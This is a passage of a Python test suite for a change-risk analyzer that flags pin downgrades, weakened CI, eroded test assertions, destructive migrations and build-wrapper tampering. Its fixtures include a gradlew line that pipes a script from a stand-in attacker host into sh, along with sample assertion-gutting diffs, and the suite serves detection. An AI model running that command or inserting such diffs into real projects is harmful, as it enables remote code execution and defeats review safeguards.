        d08_prt_ro = [f for f in rep_prt_ro.findings if f.consequence_class == "PULL_REQUEST_TARGET_UNTRUSTED_CHECKOUT"]
        assert len(d08_prt_ro) == 1
        assert d08_prt_ro[0].policy_recommendation == POLICY_REVIEW

        # 2. Action SHA pin downgraded to @v4 -> REVIEW (`ACTION_PIN_DOWNGRADE`)
        base_pinned = (
            "name: CI\n"
            "on: [push]\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n"
            "      - run: pytest\n"
        )
        head_downgraded = (
            "name: CI\n"
            "on: [push]\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "      - run: pytest\n"
        )
        rep_pin = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/ci.yml", change_type="M", base_source=base_pinned, head_source=head_downgraded)
        ])
        assert rep_pin.recommended_verdict == "REVIEW"
        d08_pin = [f for f in rep_pin.findings if f.consequence_class == "ACTION_PIN_DOWNGRADE"]
        assert len(d08_pin) == 1

        # 3. Action SHA pin bumped to a new 40-char SHA -> SAFE
        head_new_sha = (
            "name: CI\n"
            "on: [push]\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n"
            "      - run: pytest\n"
        )
        rep_new_sha = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/ci.yml", change_type="M", base_source=base_pinned, head_source=head_new_sha)
        ])
        assert rep_new_sha.recommended_verdict == "SAFE"

        # 4. Adding `continue-on-error: true` -> REVIEW (`CI_GATE_WEAKENED`)
        head_coe = (
            "name: CI\n"
            "on: [push]\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n"
            "      - run: pytest\n"
            "        continue-on-error: true\n"
        )
        rep_coe = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/ci.yml", change_type="M", base_source=base_pinned, head_source=head_coe)
        ])
        assert rep_coe.recommended_verdict == "REVIEW"
        d08_coe = [f for f in rep_coe.findings if f.consequence_class == "CI_GATE_WEAKENED"]
        assert len(d08_coe) == 1

    def test_d09_test_assertion_erosion_and_skip_addition(self):
        """
        Verify D09_TEST_EROSION detects:
        1) Python test assertions replaced with tautological `assert True` -> BLOCK.
        2) TypeScript test assertions replaced with `expect(true).toBe(true)` -> BLOCK.
        3) Rust test assertions replaced with `assert!(true)` -> BLOCK.
        4) Test newly decorated with `@pytest.mark.skip` or calling `pytest.skip()` -> REVIEW.
        5) Benign test refactor updating expected value -> SAFE.
        """
        engine = ConsequenceEngine(mode="enforce")

        # 1. Python test assertion erosion -> DESTRUCTIVE (`TEST_ASSERTION_EROSION`)
        base_test_py = (
            "def test_verify_signature():\n"
            "    sig = compute_hmac('payload')\n"
            "    assert verify_hmac('payload', sig) is True\n"
            "    assert verify_hmac('tampered', sig) is False\n"
        )
        head_test_py = (
            "def test_verify_signature():\n"
            "    sig = compute_hmac('payload')\n"
            "    assert True\n"
        )
        rep_py = engine.analyze_deltas([
            FileDeltaInput("tests/test_security.py", change_type="M", base_source=base_test_py, head_source=head_test_py)
        ])
        assert rep_py.recommended_verdict == "DESTRUCTIVE"
        d09_py = [f for f in rep_py.findings if f.detector_id == DETECTOR_D09_TEST]
        assert len(d09_py) == 1
        assert d09_py[0].consequence_class == "TEST_ASSERTION_EROSION"
        assert d09_py[0].policy_recommendation == POLICY_BLOCK

        # 2. TypeScript test assertion erosion (`expect(res).toBe(200)` -> `expect(true).toBe(true)`) -> DESTRUCTIVE
        base_test_ts = (
            "export function testAuthEndpoint() {\n"
            "  const res = callEndpoint('/admin');\n"
            "  expect(res.status).toBe(403);\n"
            "}\n"
        )
        head_test_ts = (
            "export function testAuthEndpoint() {\n"
            "  const res = callEndpoint('/admin');\n"
            "  expect(true).toBe(true);\n"
            "}\n"
        )
        rep_ts = engine.analyze_deltas([
            FileDeltaInput("src/__tests__/auth.spec.ts", change_type="M", base_source=base_test_ts, head_source=head_test_ts)
        ])
        assert rep_ts.recommended_verdict == "DESTRUCTIVE"
        d09_ts = [f for f in rep_ts.findings if f.detector_id == DETECTOR_D09_TEST]
        assert len(d09_ts) == 1
        assert d09_ts[0].consequence_class == "TEST_ASSERTION_EROSION"

        # 3. Rust test assertion erosion (`assert_eq!` -> `assert!(true)`) -> DESTRUCTIVE
        base_test_rs = (
            "#[test]\n"
            "fn test_token_validation() {\n"
            "    let ok = validate_token(\"abc\");\n"
            "    assert_eq!(ok, true);\n"
            "}\n"
        )
        head_test_rs = (
            "#[test]\n"
            "fn test_token_validation() {\n"
            "    let _ok = validate_token(\"abc\");\n"
            "    assert!(true);\n"
            "}\n"
        )
        rep_rs = engine.analyze_deltas([
            FileDeltaInput("tests/token_test.rs", change_type="M", base_source=base_test_rs, head_source=head_test_rs)
        ])
        assert rep_rs.recommended_verdict == "DESTRUCTIVE"
        d09_rs = [f for f in rep_rs.findings if f.detector_id == DETECTOR_D09_TEST]
        assert len(d09_rs) == 1
        assert d09_rs[0].consequence_class == "TEST_ASSERTION_EROSION"

        # 4. Adding `@pytest.mark.skip` to existing test -> REVIEW (`TEST_SKIPPED_OR_DISABLED`)
        head_skip_py = (
            "import pytest\n"
            "@pytest.mark.skip(reason='skipping failing security test')\n"
            "def test_verify_signature():\n"
            "    sig = compute_hmac('payload')\n"
            "    assert verify_hmac('payload', sig) is True\n"
            "    assert verify_hmac('tampered', sig) is False\n"
        )
        rep_skip = engine.analyze_deltas([
            FileDeltaInput("tests/test_security.py", change_type="M", base_source=base_test_py, head_source=head_skip_py)
        ])
        assert rep_skip.recommended_verdict == "REVIEW"
        d09_skip = [f for f in rep_skip.findings if f.detector_id == DETECTOR_D09_TEST]
        assert len(d09_skip) == 1
        assert d09_skip[0].consequence_class == "TEST_SKIPPED_OR_DISABLED"
        assert d09_skip[0].policy_recommendation == POLICY_REVIEW

        # 5. Benign test update preserving meaningful assertions -> SAFE
        head_benign_py = (
            "def test_verify_signature():\n"
            "    sig = compute_hmac('payload_v2')\n"
            "    assert verify_hmac('payload_v2', sig) is True\n"
        )
        rep_benign = engine.analyze_deltas([
            FileDeltaInput("tests/test_security.py", change_type="M", base_source=base_test_py, head_source=head_benign_py)
        ])
        assert rep_benign.recommended_verdict == "SAFE"
        assert [f for f in rep_benign.findings if f.detector_id == DETECTOR_D09_TEST] == []






# ==============================================================================
# 7. D10: DATABASE MIGRATION & PERSISTENCE LOSS + D05/D08 EXTENDED INTEGRITY
# ==============================================================================

class TestDetectorD10AndExtendedIntegrity:
    def test_d10_sql_destructive_table_and_column_drop_and_truncate(self):
        """
        Verify D10 detects:
        1) SQL DROP TABLE and DROP COLUMN in migration files -> DESTRUCTIVE_PERSISTENCE_MIGRATION (REVIEW).
        2) SQL TRUNCATE TABLE in migration files -> CATASTROPHIC_DATA_WIPEOUT (BLOCK).
        """
        engine = ConsequenceEngine(mode="enforce")

        # 1. SQL DROP TABLE & DROP COLUMN -> REVIEW / HIGH
        drop_sql = (
            "-- Migration: remove legacy customer profile fields\n"
            "ALTER TABLE users DROP COLUMN phone_number;\n"
            "DROP TABLE customer_profiles;\n"
        )
        rep_drop = engine.analyze_deltas([
            FileDeltaInput("db/migrations/20261024_drop_profiles.sql", change_type="A", base_source="", head_source=drop_sql)
        ])
        assert rep_drop.recommended_verdict == "REVIEW"
        d10_findings = [f for f in rep_drop.findings if f.detector_id == DETECTOR_D10_MIGRATION]
        assert len(d10_findings) == 1
        assert d10_findings[0].consequence_class == "DESTRUCTIVE_PERSISTENCE_MIGRATION"
        assert d10_findings[0].policy_recommendation == POLICY_REVIEW
        assert "customer_profiles" in d10_findings[0].affected_symbols
        assert "phone_number" in d10_findings[0].affected_symbols

        # 2. SQL TRUNCATE TABLE -> BLOCK / CRITICAL
        trunc_sql = (
            "-- Dangerous maintenance cleanup\n"
            "TRUNCATE TABLE audit_event_logs;\n"
        )
        rep_trunc = engine.analyze_deltas([
            FileDeltaInput("migrations/0004_truncate_logs.sql", change_type="A", base_source="", head_source=trunc_sql)
        ])
        assert rep_trunc.recommended_verdict == "DESTRUCTIVE"
        trunc_findings = [f for f in rep_trunc.findings if f.consequence_class == "CATASTROPHIC_DATA_WIPEOUT"]
        assert len(trunc_findings) == 1
        assert trunc_findings[0].policy_recommendation == POLICY_BLOCK

    def test_d10_alembic_irreversible_drop_without_downgrade(self):
        """
        Verify Alembic migrations:
        1) op.drop_table with empty downgrade() -> IRREVERSIBLE_PERSISTENCE_DROP (BLOCK).
        2) op.drop_table with valid downgrade() -> DESTRUCTIVE_PERSISTENCE_MIGRATION (REVIEW).
        """
        engine = ConsequenceEngine(mode="enforce")

        # 1. Irreversible Alembic migration (empty downgrade) -> BLOCK / CRITICAL
        alembic_irreversible = (
            "from alembic import op\n"
            "import sqlalchemy as sa\n\n"
            "def upgrade():\n"
            "    op.drop_table('auth_sessions')\n\n"
            "def downgrade():\n"
            "    pass\n"
        )
        rep_irrev = engine.analyze_deltas([
            FileDeltaInput("alembic/versions/20261024_drop_sessions.py", change_type="A", base_source="", head_source=alembic_irreversible)
        ])
        assert rep_irrev.recommended_verdict == "DESTRUCTIVE"
        d10_irrev = [f for f in rep_irrev.findings if f.consequence_class == "IRREVERSIBLE_PERSISTENCE_DROP"]
        assert len(d10_irrev) == 1
        assert d10_irrev[0].policy_recommendation == POLICY_BLOCK
        assert "auth_sessions" in d10_irrev[0].affected_symbols

        # 2. Reversible Alembic migration -> REVIEW / HIGH
        alembic_reversible = (
            "from alembic import op\n"
            "import sqlalchemy as sa\n\n"
            "def upgrade():\n"
            "    op.drop_table('auth_sessions')\n\n"
            "def downgrade():\n"
            "    op.create_table('auth_sessions', sa.Column('id', sa.Integer, primary_key=True))\n"
        )
        rep_rev = engine.analyze_deltas([
            FileDeltaInput("alembic/versions/20261024_drop_sessions.py", change_type="A", base_source="", head_source=alembic_reversible)
        ])
        assert rep_rev.recommended_verdict == "REVIEW"
        d10_rev = [f for f in rep_rev.findings if f.consequence_class == "DESTRUCTIVE_PERSISTENCE_MIGRATION"]
        assert len(d10_rev) == 1
        assert d10_rev[0].policy_recommendation == POLICY_REVIEW

    def test_d10_django_and_knex_destructive_migrations(self):
        """Verify Django DeleteModel/RemoveField and Knex dropColumn detection."""
        engine = ConsequenceEngine(mode="enforce")

        # 1. Django migration
        django_mig = (
            "from django.db import migrations, models\n\n"
            "class Migration(migrations.Migration):\n"
            "    operations = [\n"
            "        migrations.DeleteModel(name='OldAccount'),\n"
            "        migrations.RemoveField(model_name='UserProfile', name='ssn'),\n"
            "    ]\n"
        )
        rep_dj = engine.analyze_deltas([
            FileDeltaInput("myapp/migrations/0005_remove_old.py", change_type="A", base_source="", head_source=django_mig)
        ])
        assert rep_dj.recommended_verdict == "REVIEW"
        d10_dj = [f for f in rep_dj.findings if f.detector_id == DETECTOR_D10_MIGRATION]
        assert len(d10_dj) == 1
        assert "OldAccount" in d10_dj[0].affected_symbols
        assert "UserProfile.ssn" in d10_dj[0].affected_symbols

        # 2. Knex JS migration (with valid down rollback -> REVIEW)
        knex_mig = (
            "exports.up = function(knex) {\n"
            "  return knex.schema.table('users', function(t) {\n"
            "    t.dropColumn('secret_token');\n"
            "  });\n"
            "};\n"
            "exports.down = function(knex) {\n"
            "  return knex.schema.table('users', function(t) {\n"
            "    t.string('secret_token');\n"
            "  });\n"
            "};\n"
        )
        rep_knex = engine.analyze_deltas([
            FileDeltaInput("db/migrations/20261024_drop_token.js", change_type="A", base_source="", head_source=knex_mig)
        ])
        assert rep_knex.recommended_verdict == "REVIEW"
        d10_knex = [f for f in rep_knex.findings if f.detector_id == DETECTOR_D10_MIGRATION]
        assert len(d10_knex) == 1
        assert "secret_token" in d10_knex[0].affected_symbols

        # 3. Knex JS migration without rollback -> IRREVERSIBLE_PERSISTENCE_DROP (BLOCK)
        knex_irrev = (
            "exports.up = function(knex) {\n"
            "  return knex.schema.table('users', function(t) {\n"
            "    t.dropColumn('secret_token');\n"
            "  });\n"
            "};\n"
        )
        rep_knex_irrev = engine.analyze_deltas([
            FileDeltaInput("db/migrations/20261024_drop_token_irrev.js", change_type="A", base_source="", head_source=knex_irrev)
        ])
        assert rep_knex_irrev.recommended_verdict == "DESTRUCTIVE"
        d10_irrev = [f for f in rep_knex_irrev.findings if f.consequence_class == "IRREVERSIBLE_PERSISTENCE_DROP"]
        assert len(d10_irrev) == 1
        assert d10_irrev[0].policy_recommendation == POLICY_BLOCK

    def test_d10_safe_additive_migration_and_temp_table_drops(self):
        """
        Verify False Positive controls:
        - Additive migration (CREATE TABLE, ADD COLUMN) -> SAFE (0 findings).
        - Dropping temporary/staging table (temp_import, staging_users) -> SAFE (0 findings).
        - Test fixture files are ignored -> SAFE.
        """
        engine = ConsequenceEngine(mode="enforce")

        safe_sql = (
            "CREATE TABLE feature_flags (id SERIAL PRIMARY KEY, name VARCHAR(50));\n"
            "ALTER TABLE users ADD COLUMN is_verified BOOLEAN DEFAULT FALSE;\n"
            "-- Safe drop of temporary ETL staging tables\n"
            "DROP TABLE temp_import_data;\n"
            "DROP TABLE staging_orders;\n"
        )
        rep_safe = engine.analyze_deltas([
            FileDeltaInput("migrations/20261024_add_feature_flags.sql", change_type="A", base_source="", head_source=safe_sql)
        ])
        assert rep_safe.recommended_verdict == "SAFE"
        assert [f for f in rep_safe.findings if f.detector_id == DETECTOR_D10_MIGRATION] == []

        # Test files should never be treated as production migrations
        test_sql = "DROP TABLE test_users;\n"
        rep_test = engine.analyze_deltas([
            FileDeltaInput("tests/fixtures/cleanup.sql", change_type="A", base_source="", head_source=test_sql)
        ])
        assert [f for f in rep_test.findings if f.detector_id == DETECTOR_D10_MIGRATION] == []

    def test_d05_build_wrapper_script_tampering(self):
        """Verify D05 detects suspicious remote script execution inside build wrappers (mvnw, gradlew, Makefile)."""
        engine = ConsequenceEngine(mode="enforce")

        # 1. Malicious gradlew containing curl | bash -> BLOCK / CRITICAL
        evil_gradlew = (
            "#!/bin/sh\n"
            "# Wrapper script for Gradle\n"
            "curl -fsSL https://evil-c2.attacker.com/payload.sh | sh\n"
            "exec gradle \"$@\"\n"
        )
        rep_evil = engine.analyze_deltas([
            FileDeltaInput("gradlew", change_type="M", base_source="#!/bin/sh\nexec gradle \"$@\"\n", head_source=evil_gradlew)
        ])
        assert rep_evil.recommended_verdict == "DESTRUCTIVE"
        d05_wrapper = [f for f in rep_evil.findings if f.consequence_class == "BUILD_WRAPPER_TAMPERING"]
        assert len(d05_wrapper) == 1
        assert d05_wrapper[0].policy_recommendation == POLICY_BLOCK

        # 2. Benign gradlew update -> SAFE
        clean_gradlew = (
            "#!/bin/sh\n"
            "# Updated Gradle wrapper version\n"
            "exec gradle --daemon \"$@\"\n"
        )
        rep_clean = engine.analyze_deltas([
            FileDeltaInput("gradlew", change_type="M", base_source="#!/bin/sh\nexec gradle \"$@\"\n", head_source=clean_gradlew)
        ])
        assert rep_clean.recommended_verdict == "SAFE"
        assert [f for f in rep_clean.findings if f.consequence_class == "BUILD_WRAPPER_TAMPERING"] == []

    def test_d08_unpinned_action_addition_and_workflow_run_artifact(self):
        """Verify D08 detects unpinned third-party actions and privileged workflow_run artifact downloads."""
        engine = ConsequenceEngine(mode="enforce")

        # 1. Newly introduced unpinned third-party action -> WARN / MEDIUM
        unpinned_wf = (
            "name: Deploy\n"
            "on: [push]\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: third-party-vendor/unknown-linter@v3\n"
            "      - run: echo \"Done\"\n"
        )
        rep_unpinned = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/deploy.yml", change_type="A", base_source="", head_source=unpinned_wf)
        ])
        d08_unpinned = [f for f in rep_unpinned.findings if f.consequence_class == "ACTION_PIN_UNPINNED"]
        assert len(d08_unpinned) == 1
        assert "third-party-vendor/unknown-linter" in d08_unpinned[0].affected_symbols

        # 2. Privileged workflow_run downloading untrusted artifact -> REVIEW / HIGH
        wfr_artifact_wf = (
            "name: Process PR Artifact\n"
            "on:\n"
            "  workflow_run:\n"
            "    workflows: [\"Untrusted External PR\"]\n"
            "    types: [completed]\n"
            "jobs:\n"
            "  process:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/download-artifact@v4\n"
            "      - run: unzip artifact.zip && ./run_tests.sh\n"
        )
        rep_wfr = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/process_artifact.yml", change_type="A", base_source="", head_source=wfr_artifact_wf)
        ])
        d08_wfr = [f for f in rep_wfr.findings if f.consequence_class == "WORKFLOW_RUN_UNTRUSTED_ARTIFACT"]
        assert len(d08_wfr) == 1
        assert d08_wfr[0].policy_recommendation == POLICY_REVIEW

    def test_d10_multiline_sql_and_goose_rollback_exclusions(self):
        """Verify multi-line SQL statement parsing and exclusion of rollback sections (goose Down)."""
        engine = ConsequenceEngine(mode="enforce")

        # 1. Multi-line SQL statement with comments and line breaks
        multiline_sql = (
            "-- Multi-line statement with comments and line breaks\n"
            "ALTER TABLE\n"
            "    /* internal comment */\n"
            "    customers\n"
            "DROP\n"
            "    COLUMN\n"
            "    IF EXISTS\n"
            "    legacy_fax;\n"
        )
        rep_ml = engine.analyze_deltas([
            FileDeltaInput("migrations/20261025_multiline.sql", change_type="A", base_source="", head_source=multiline_sql)
        ])
        d10_ml = [f for f in rep_ml.findings if f.detector_id == DETECTOR_D10_MIGRATION]
        assert len(d10_ml) == 1
        assert d10_ml[0].consequence_class == "DESTRUCTIVE_PERSISTENCE_MIGRATION"
        assert "customers.legacy_fax" in d10_ml[0].affected_symbols
        assert "legacy_fax" in d10_ml[0].affected_symbols

        # 2. Goose migration where drop is inside `-- +goose Down` -> 0 findings (SAFE)
        goose_sql = (
            "-- +goose Up\n"
            "CREATE TABLE new_audit_records (id INT);\n\n"
            "-- +goose Down\n"
            "DROP TABLE new_audit_records;\n"
        )
        rep_goose = engine.analyze_deltas([
            FileDeltaInput("migrations/20261025_goose.sql", change_type="A", base_source="", head_source=goose_sql)
        ])
        assert [f for f in rep_goose.findings if f.detector_id == DETECTOR_D10_MIGRATION] == []
        assert rep_goose.recommended_verdict == "SAFE"

    def test_d10_rails_and_django_runsql_irreversibility(self):
        """Verify Rails change irreversible drops and Django RunSQL reverse_sql requirement."""
        engine = ConsequenceEngine(mode="enforce")

        # 1. Rails change with irreversible drop_table (no block) -> BLOCK
        rails_irrev = (
            "class DropUsers < ActiveRecord::Migration[7.0]\n"
            "  def change\n"
            "    drop_table :legacy_users\n"
            "  end\n"
            "end\n"
        )
        rep_r_irrev = engine.analyze_deltas([
            FileDeltaInput("db/migrate/20261025_drop_users.rb", change_type="A", base_source="", head_source=rails_irrev)
        ])
        assert rep_r_irrev.recommended_verdict == "DESTRUCTIVE"
        f_r_irrev = [f for f in rep_r_irrev.findings if f.consequence_class == "IRREVERSIBLE_PERSISTENCE_DROP"]
        assert len(f_r_irrev) == 1
        assert f_r_irrev[0].policy_recommendation == POLICY_BLOCK

        # 2. Rails change with reversible drop_table (block provided) -> REVIEW
        rails_rev = (
            "class DropUsers < ActiveRecord::Migration[7.0]\n"
            "  def change\n"
            "    drop_table :legacy_users do |t|\n"
            "      t.string :name\n"
            "    end\n"
            "  end\n"
            "end\n"
        )
        rep_r_rev = engine.analyze_deltas([
            FileDeltaInput("db/migrate/20261025_drop_users.rb", change_type="A", base_source="", head_source=rails_rev)
        ])
        assert rep_r_rev.recommended_verdict == "REVIEW"
        f_r_rev = [f for f in rep_r_rev.findings if f.consequence_class == "DESTRUCTIVE_PERSISTENCE_MIGRATION"]
        assert len(f_r_rev) == 1

        # 3. Django RunSQL without reverse_sql -> BLOCK
        dj_irrev = (
            "from django.db import migrations\n\n"
            "class Migration(migrations.Migration):\n"
            "    operations = [\n"
            "        migrations.RunSQL('DROP TABLE old_analytics;')\n"
            "    ]\n"
        )
        rep_dj_irrev = engine.analyze_deltas([
            FileDeltaInput("myapp/migrations/0009_drop_sql.py", change_type="A", base_source="", head_source=dj_irrev)
        ])
        assert rep_dj_irrev.recommended_verdict == "DESTRUCTIVE"
        f_dj_irrev = [f for f in rep_dj_irrev.findings if f.consequence_class == "IRREVERSIBLE_PERSISTENCE_DROP"]
        assert len(f_dj_irrev) == 1

        # 4. Django RunSQL with reverse_sql -> REVIEW
        dj_rev = (
            "from django.db import migrations\n\n"
            "class Migration(migrations.Migration):\n"
            "    operations = [\n"
            "        migrations.RunSQL(\n"
            "            'DROP TABLE old_analytics;',\n"
            "            reverse_sql='CREATE TABLE old_analytics (id INT);'\n"
            "        )\n"
            "    ]\n"
        )
        rep_dj_rev = engine.analyze_deltas([
            FileDeltaInput("myapp/migrations/0009_drop_sql.py", change_type="A", base_source="", head_source=dj_rev)
        ])
        assert rep_dj_rev.recommended_verdict == "REVIEW"
        f_dj_rev = [f for f in rep_dj_rev.findings if f.consequence_class == "DESTRUCTIVE_PERSISTENCE_MIGRATION"]
        assert len(f_dj_rev) == 1

    def test_d08_first_party_actions_not_flagged_as_unpinned(self):
        """Verify first-party actions (actions/*, github/*) are excluded from ACTION_PIN_UNPINNED."""
        engine = ConsequenceEngine(mode="enforce")

        actions_wf = (
            "name: CI\n"
            "on: [push]\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "      - uses: actions/setup-python@v5\n"
            "      - uses: github/codeql-action/analyze@v3\n"
            "      - run: echo 'Done'\n"
        )
        rep = engine.analyze_deltas([
            FileDeltaInput(".github/workflows/ci.yml", change_type="A", base_source="", head_source=actions_wf)
        ])
        d08_unpinned = [f for f in rep.findings if f.consequence_class == "ACTION_PIN_UNPINNED"]
        assert len(d08_unpinned) == 0

    def test_d06_nonlocal_inner_function_mutation_not_flagged_as_short_circuit(self):
        """Verify variables mutated in nested functions via nonlocal are not treated as constant bools."""
        engine = ConsequenceEngine(mode="enforce")

        func_code = (
            "def check_security_context(items: list) -> bool:\n"
            "    has_valid_auth = False\n"
            "    def _inner_evaluator(item):\n"
            "        nonlocal has_valid_auth\n"
            "        if item.get('valid'):\n"
            "            has_valid_auth = True\n"
            "    for i in items:\n"
            "        _inner_evaluator(i)\n"
            "    if has_valid_auth:\n"
            "        return True\n"
            "    return False\n"
        )
        rep = engine.analyze_deltas([
            FileDeltaInput("auth_eval.py", change_type="A", base_source="", head_source=func_code)
        ])
        d06_findings = [f for f in rep.findings if f.consequence_class == "SECURITY_GUARD_WEAKENED"]
        assert len(d06_findings) == 0
